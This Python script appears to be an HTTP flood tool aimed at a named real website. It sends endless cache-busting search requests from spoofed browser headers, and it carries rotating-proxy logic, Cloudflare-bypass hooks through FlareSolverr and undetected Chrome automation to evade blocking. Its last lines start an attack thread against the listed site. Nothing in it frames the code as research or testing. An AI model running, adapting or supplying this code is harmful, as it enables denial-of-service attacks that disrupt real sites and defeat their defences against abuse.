from urllib import request
import requests
import json
from threading import Thread, Lock
import random
import string
import time
from selenium.webdriver.chrome.webdriver import WebDriver
import os
import re
import undetected_chromedriver as uc
import shutil

# printing lowercase
letters = string.ascii_lowercase

PORT=10000
PROXY_URL_BASE = 'http://gate.smartproxy.com'

PROXY_URL= ''

proxies = {
   'http': PROXY_URL,
   'https': PROXY_URL,
}

attackList = [
'https://www.business2community.com',
]

def checkIp():
	ipUrl='https://api.ipify.org'
	print(requests.get(ipUrl, proxies=proxies).content)
	# input()


def checkmyHeaders():
	url='http://myhttpheader.com/'
	data = {"cmd": "request.get",
			"url": url,
			}
	resStr = requests.post(flareSolverUrl, json=data).content
	print(resStr)
	input()

def changeProxies():
	global PROXY_URL, proxies, PORT

	PORT=random.randrange(10000,49999)
	PROXY_URL = PROXY_URL

	PROXY_URL = PROXY_URL_BASE + ":" + str(PORT)

	proxies = {
   'http': PROXY_URL,
   'https': PROXY_URL,
	}

def attackUrlCF(baseUrl):	
	global cookiesStr, userAgent

	while True:
		try:
			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 

			headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1',
			'Sec-Fetch-Dest': 'document',
			'Sec-Fetch-Mode': 'navigate',
			'Sec-Fetch-Site': 'none',
			'Sec-Fetch-User': '?1',
			'Pragma': 'no-cache',
			'Cache-Control': 'no-cache'
			}

			# checkIp()

			res = requests.get(url, headers=headers)
			print(res, res.content)
			if str(res.status_code) in ['503', '403', '429']:
				input('blocked')
			
			# input()
		except Exception as err:
			print(err)
			#input()

FLARESOLVERR_VERSION = None
CHROME_MAJOR_VERSION = None
USER_AGENT = None
XVFB_DISPLAY = None
PATCHED_DRIVER_PATH = None

def get_chrome_exe_path() -> str:
    return uc.find_chrome_executable()

def extract_version_registry(output) -> str:
    try:
        google_version = ''
        for letter in output[output.rindex('DisplayVersion    REG_SZ') + 24:]:
            if letter != '\n':
                google_version += letter
            else:
                break
        return google_version.strip()
    except TypeError:
        return ''



def extract_version_folder() -> str:
    # Check if the Chrome folder exists in the x32 or x64 Program Files folders.
    for i in range(2):
        path = 'C:\\Program Files' + (' (x86)' if i else '') + '\\Google\\Chrome\\Application'
        if os.path.isdir(path):
            paths = [f.path for f in os.scandir(path) if f.is_dir()]
            for path in paths:
                filename = os.path.basename(path)
                pattern = '\d+\.\d+\.\d+\.\d+'
                match = re.search(pattern, filename)
                if match and match.group():
                    # Found a Chrome version.
                    return match.group(0)
    return ''


def get_chrome_major_version() -> str:
    global CHROME_MAJOR_VERSION
    if CHROME_MAJOR_VERSION is not None:
        return CHROME_MAJOR_VERSION

    if os.name == 'nt':
        try:
            stream = os.popen(
                'reg query "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome"')
            output = stream.read()
            # Example: '104.0.5112.79'
            complete_version = extract_version_registry(output)
        except Exception:
            # Example: '104.0.5112.79'
            complete_version = extract_version_folder()
    else:
        chrome_path = uc.find_chrome_executable()
        process = os.popen(f'"{chrome_path}" --version')
        # Example 1: 'Chromium 104.0.5112.79 Arch Linux\n'
        # Example 2: 'Google Chrome 104.0.5112.79 Arch Linux\n'
        complete_version = process.read()
        process.close()

    CHROME_MAJOR_VERSION = complete_version.split('.')[0].split(' ')[-1]
    return CHROME_MAJOR_VERSION

def attackSelenium(baseUrl):
	global PATCHED_DRIVER_PATH

	options = uc.ChromeOptions()
	# options.add_argument('--no-sandbox')
	options.add_argument('--window-size=1920,1080')
	# if we are inside the Docker container, we avoid downloading the driver
	driver_exe_path = None
	version_main = None
	if os.path.exists("/app/chromedriver"):
		# running inside Docker
		driver_exe_path = "/app/chromedriver"
	else:
		version_main = get_chrome_major_version()
		if PATCHED_DRIVER_PATH is not None:
			driver_exe_path = PATCHED_DRIVER_PATH

	# downloads and patches the chromedriver
	# if we don't set driver_executable_path it downloads, patches, and deletes the driver each time
	driver = uc.Chrome(options=options, driver_executable_path=driver_exe_path, version_main=version_main,
		windows_headless=False)

	# save the patched driver to avoid re-downloads
	if driver_exe_path is None:
		PATCHED_DRIVER_PATH = os.path.join(driver.patcher.data_path, driver.patcher.exe_name)
		shutil.copy(driver.patcher.executable_path, PATCHED_DRIVER_PATH)

	while True:
		try:
			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
			driver.get(url)
			input()
		except Exception as err:
			print(err)
			#input()


flareSolverUrl = 'http://localhost:8191/v1'


for i in range(1):
	Thread(target=attackUrlCF, args=['https://www.business2community.com']).start()
input()


